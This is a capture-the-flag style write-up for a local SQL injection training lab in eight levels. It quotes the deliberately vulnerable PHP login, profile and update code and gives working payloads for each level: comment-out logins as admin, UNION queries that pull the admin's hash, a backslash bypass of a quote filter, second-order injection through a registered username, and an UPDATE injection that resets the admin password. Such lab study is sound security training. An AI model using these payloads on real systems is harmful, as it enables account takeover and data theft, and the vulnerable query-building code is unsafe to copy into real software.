[Level 1] Target: http://localhost:24001
	Goal: login as admin

	First, let take a look at index.php
	
	try {
		include("db.php");
		$database = make_connection("plaintext_db");

		$sql = "SELECT username FROM users WHERE username='$post_username' AND password='$post_password'";
		$query = $database->query($sql);
		$user = $query->fetch_assoc(); // Get the first row

		if ($user === NULL)
			return "Wrong username or password"; // No result

		$username = $user["username"];
		if ($username === "admin")
			return "Wow you can log in as admin, here is your flag CBJS{FAKE_FLAG_FAKE_FLAG}, but how about <a href='level2.php'>THIS LEVEL</a>!";
		else
			return "You log in as $username, but then what? You are not an admin";
	} catch (mysqli_sql_exception $e) {
		return $e->getMessage();
	}

	// nothing special this lab, no filter

	if (isset($_POST["username"]) && isset($_POST["password"])) {
		$post_username = $_POST["username"];
		$post_password = $_POST["password"];
		$message = loginHandler($post_username, $post_password);
	}
	// just exist username and password
	
	// we can login to the database to see something by chech the Dockerfile
	
	...
        environment:$result
            # These password and stuff is not necessary too secret
            - MYSQL_HOSTNAME=db
            - MYSQL_ROOT_PASSWORD=45299417d86f231f6a584d1488edb763
            - MYSQL_USER=db_user
            - MYSQL_PASSWORD=db_password
        ...
        
        we can connect to mysql, let see
        
        mysql> select * from users;
        +----+------------------+---------------------+
        | id | username         | password            |
        +----+------------------+---------------------+
        |  1 | conmeo           | meow                |
        |  2 | trudie92         | 123456              |
        |  3 | deckow.vernie    | 123456789           |
        |  4 | alta35           | qwerty              |
        |  5 | nikki13          | password            |
        |  6 | ritchie.benton   | 1q2w3e              |
        |  7 | kzboncak         | guest               |
        |  8 | ulueilwitz       | luzit2000           |
        |  9 | maegan.roob      | football            |
        | 10 | nicholaus.ledner | master              |
        | 11 | admin            | impossible@password |
        ...
        
        !! But this is not the way we solve this lab
        
        =>> Take all the things we have, we just need to use a trick, with username admin'#
        =>> This will change the things after username to comment
        SELECT username FROM users WHERE username='admin'#' AND password='$post_password'
        
        FINAL RESULT: login as admin 
        
[Level 2] Target: http://localhost:24001/level2.php
	Goal: Login as admin
	
	- First, let check across all files, nothing change, but let take a look at level2.php
	
	$sql = "SELECT username FROM users WHERE username=\"$post_username\" AND password=\"$post_password\"";
	
	// you see \" is used to avoid querry error
	
	=>> Solve this lab quite easy if you learnt about coding, \" just avoid query in php, not sql
	=>> so what should we do? 
	"SELECT username FROM users WHERE username=\"$post_username"#\" AND password=\"$post_password\""
	
	=>> username: admin"#
	
	FINAL RESULT: login as admin successful
	
[Level 3] Target: http://localhost:24001/level3.php
	Goal: Login as admin
	
	- Nothing change in this level, you can use the logic that we solved 2 previous levels
	
	$sql = "SELECT username FROM users WHERE username=LOWER('$post_username') AND password=LOWER('$post_password')";

        => SELECT username FROM users WHERE username=LOWER('admin')#' AND password=LOWER('$post_password') 
        =>> username: admin')#
        
        
        
        
[Level 4] Target: http://localhost:24001/level4.php
	Goal: Login as admin
	
	- First, let take a look at level4.php file
	
	try {
		include("db.php");
		$database = make_connection("hashed_db");

		$sql = "SELECT username, password FROM users WHERE username='$post_username'";
		$query = $database->query($sql);
		$user = $query->fetch_assoc(); // Get the first row

		if ($user === NULL)
			return "Username not found"; // No result

		$username = $user["username"];
		$password = $user["password"];
		$post_password = md5($post_password);

		if ($password !== $post_password)
			return "Wrong username or password";

		if ($username === "admin")
			return "Wow you can log in as admin, here is your flag CBJS{FAKE_FLAG_FAKE_FLAG}, but how about <a href='level5.php'>THIS LEVEL</a>!";
		else
			return "You log in as $username, but then what? You are not an admin";
	} catch (mysqli_sql_exception $e) {
		return $e->getMessage();
	}
	
	// This code will check the password you typed, if it matches together, you will login
	
	=>> This level we will use UNION attack to solve, there are two way to exploit this level
	
	+> First, we can see admin's hashed password
	
	 mysql> SELECT username, password FROM users WHERE username='khanh' UNION SELECT password, 111 from users WHERE username ='admin';
        +----------------------------------+----------+
        | username                         | password |
        +----------------------------------+----------+
        | 13442cabe383b86d1e1d2ce653845349 | 111      |
        +----------------------------------+----------+
	
	=>> Because the code only take the first row, so we gonna do something wrong in the first part of mql command like username ='khanh'
	there's no username like khanh
	
	=>> this time, it will print out admin's password on screen, and the password of admin we need to type is 111
	
	+> Secend, we can control the admin's password
	
	mysql> SELECT username, password FROM users WHERE username='khanh' UNION SELECT 'admin', MD5('123');
        +----------+----------------------------------+
        | username | password                         |
        +----------+----------------------------------+
        | admin    | 202cb962ac59075b964b07152d234b70 |
        +----------+----------------------------------+
	
	=>> then username is khanh' UNION SELECT 'admin', MD5('123')
	password is 123
	
	FINAL RESULT: login as admin successful
	
	
[Level 5] Target: http://localhost:24001/level5.php
	Goal: Login as admin
	
	- let take a look at level5.php, you can not use any ' , can we solve this level? let see
	
	function checkValid($data)
	{
    		if (strpos($data, "'") !== false) return false;
    		return true;
	}
	
	=>> this lab just check if you are admin or not, dont check your password,
	
	$sql = "SELECT username FROM users WHERE username='$post_username' AND password=MD5('$post_password')";
	
	=>> we cannt use ' BUT we can use the trick to avoid the query error is \' \"
	=>> When we type username is khanh\
	=>> The command will be like SELECT username FROM users WHERE username='khanh\' AND password=MD5('$post_password')
	=>> the username after: khanh' AND password=MD5(
	=>> this time, we will control the $post_password to became: UNION select  admin;#
	=>> full command will be: 
	
	mysql> SELECT username FROM users WHERE username='khanh\' AND password=MD5(' UNION SELECT admin;#')
            +----------+
            | username |
            +----------+
            | admin    |
            +----------+
	
	
	FINAL RESULT: login as admin successful
	
[Level 6] Target: http://localhost:24001/level6.php
	
	Goal: extract database version
	
	- Let check out the posts_db database
	
	mysql> select * from posts;
	+----+--------------------------------------------------------------+
	| id | content                                                      |
	+----+--------------------------------------------------------------+
	|  1 | https://blog.cyberjutsu.io/2021/08/09/hoc-an-toan-thong-tin/ |
	|  2 | https://blog.cyberjutsu.io/2021/06/02/IDOL-streamer-vs-XSS/  |
	|  3 | https://blog.cyberjutsu.io/2021/05/13/HTML-sanitizer-vs-XSS/ |
	+----+--------------------------------------------------------------+

	mysql> select * from secret6;
	+----+---------------------------+
	| id | content                   |
	+----+---------------------------+
	|  1 | CBJS{FAKE_FLAG_FAKE_FLAG} |
	+----+---------------------------+
	
	=>> I think this is our goal
	
	=>> you can see in level6.php file, This level is quite easy right
	
	if (isset($_GET["id"])) {
    try {
        include("db.php");
        $database = make_connection("posts_db");

        $id = $database->real_escape_string($_GET["id"]);
        $sql = "SELECT content FROM posts WHERE id=" . $id;
        $db_result = $database->query($sql);
        
        if ($db_result->num_rows > 0) {
            $row = $db_result->fetch_assoc(); // Get the first row
            $message = "<iframe height='800px' width='100%' src='" . $row["content"] . "'></iframe>";
        } else {
            $message = "ID not found";
        }
    } catch (mysqli_sql_exception $e) {
        $message = $e->getMessage();
    }
}

// nothing protected here
	
	=>> SELECT content FROM posts WHERE id=0 UNION select content from secret6;
	
	
	FINAL RESULT: CBJS{FAKE_FLAG_FAKE_FLAG}
	
	
[Advanced lab - level 7] Target: http://localhost:24001/advanced/level7.php
	
	
	Firstly, let look at level7.php, this is why this level named advanced lab, rigth!
	
	...
	$sql = "SELECT username FROM users WHERE username=? and password=?"; // this way to avoid sql injection, no way to exploit in this file
        $statement = $database->prepare($sql);
        $statement->bind_param('ss', $_POST['username'], md5($_POST['password']));
        $statement->execute();
        $statement->store_result();
        $statement->bind_result($result);

        if ($statement->num_rows > 0) {
            $statement->fetch();
            $_SESSION["username"] = $result;
            die(header("Location: profile.php"));
        } else {
            $message = "Wrong username or password";
        }
        ...
	
	Let check register.php file, there are somethings vulnerable
	
	...
	if (!isset($_SESSION['username']))
    	die(header("Location: level7.php"));
	// If exist a username it will redirect to level7.php, nothing special 
	$username = $_SESSION['username'];
	if (isset($_POST['button'])) {
    	try {
        	$sql = "SELECT email FROM users WHERE username='$username'";
        	$db_result = $database->query($sql);  // it's here, no filter
        	$row = $db_result->fetch_assoc(); // Get the first row

        	if (isset($row)) 
            	$message = $row['email'];
            
    	} catch (mysqli_sql_exception $e) {
        	$message = $e->getMessage();
    	}	
	
	// it can be executed if you have a username, it will print out your email
	// if you do register in the website, it's easy to create a new account, and it will print out your email on the screen 
	
	// we can create a new account, no problem 
	
	... 
	$sql = "SELECT username from users where username=?"; // check if the username exist or not
        $statement = $database->prepare($sql);
        $statement->bind_param('s', $_POST['username']);
        $statement->execute();
        $statement->store_result();

        if ($statement->num_rows() > 0) {
            $message = "Sorry this username already registered";
        } else {
            $sql = "INSERT INTO users(username, password, email) VALUES (?, ?, ?)"; // create a new account
            $statement = $database->prepare($sql);
            $statement->bind_param('sss', $_POST['username'], md5($_POST['password']), $_POST['email']);
            $statement->execute();
            $message = "Create successful";
        }
        ...
        
        =>> So, what we gonna do?
        =>> let see again in profile.php file 
	SELECT email FROM users WHERE username='$username'
	
	
	=>> make the first part wrong and use union again
	=>> mysql> select email from users where username='noone' union select password from users where username='admin';
	+----------------------------------+
	| email                            |
	+----------------------------------+
	| 13442cabe383b86d1e1d2ce653845349 |
	+----------------------------------+

	=>> username: noone' union select password from users where username='admin
	=>> password: 123
	=>> email: khanh@gmail.com
	
	=>> login in 
	
	FINAL RESULT: Your Email: 13442cabe383b86d1e1d2ce653845349 ( show admin password)
	
	
[Advanced lab - level 8] Target: http://localhost:24001/advanced/level8.php 

	- This level we just need to focus on level8.php and updater.php
	
	- you see, level8.php is the same to level7.php
	
	- you still need to create a new account 
	
	if (!isset($_SESSION['username']))
    	die(header("location: level8.php"));

	$username = $_SESSION['username'];
	$email = $_POST['email'];
	if ($username === 'admin')
    	$message = "<h3><b>Wow you can finally log in as admin, here is your flag CBJS{FAKE_FLAG_FAKE_FLAG}</b></h3>";

	if (isset($_POST['button'])) {
    	try {
        	$sql = "UPDATE users SET email='$email' WHERE username='$username'";
        	$db_result = $database->query($sql);
        	if ($db_result) {
            	$message = "Successfully update your Email";
        	} else {
            	$message = "Failed to update your email";
        	}
    	} catch (mysqli_sql_exception $e) {
    	    $message = $e->getMessage();
    	}
	
	// there are no filter in update.php file
	// we can use control admin password
	
	...
	$sql = "INSERT INTO users(username, password, email) VALUES (?, ?, ?)";
            $statement = $database->prepare($sql);
            $statement->bind_param('sss', $_POST['username'], md5($_POST['password']), $_POST['email']);
            $statement->execute();
            $message = "Create successful";
        ...
        
        =>> we need to hash the password by md5
        
        =>> update users set email='fakeemail.com' ,password=md5('1234') where username='admin';
        
        =>> email: fakeemail.com' ,password=md5('1234') where username='admin'#
        
        mysql> select * from users;
+----+---------------------------------------------------------------+----------------------------------+--------------------+
| id | username                                                      | password                         | email              |
+----+---------------------------------------------------------------+----------------------------------+--------------------+
|  1 | conmeo                                                        | 4a4be40c96ac6314e91d93f38043a634 | NULL               |
|  2 | trudie92                                                      | 4520ae162c0aa006992454ad776377e3 | NULL               |
|  3 | deckow.vernie                                                 | 30ecdb365e4246775b7def432763b831 | NULL               |
|  4 | alta35                                                        | b66f2dbee288882f8c95be9900fdde46 | NULL               |
|  5 | nikki13                                                       | 2bc8a8d40f24d99d69365851e507a269 | NULL               |
|  6 | ritchie.benton                                                | 056125d8f71d675d3d5d6284f91ba919 | NULL               |
|  7 | kzboncak                                                      | 2756b329bfc05b6238458442cf6f4cd9 | NULL               |
|  8 | ulueilwitz                                                    | 2d1040104f4ca09c4afa876f60cd881a | NULL               |
|  9 | maegan.roob                                                   | d1c34701ced2dfeab09866fda9ace6bf | NULL               |
| 10 | nicholaus.ledner                                              | 95beceb552a962a254f04a4e94864e69 | NULL               |
| 11 | admin                                                         | 81dc9bdb52d04dc20036dbd8313ed055 | fakeemail.com      |

	
	
	FINAL RESULT: Wow you can finally log in as admin, here is your flag CBJS{FAKE_FLAG_FAKE_FLAG}
	
	
	
	
	
	
	
	
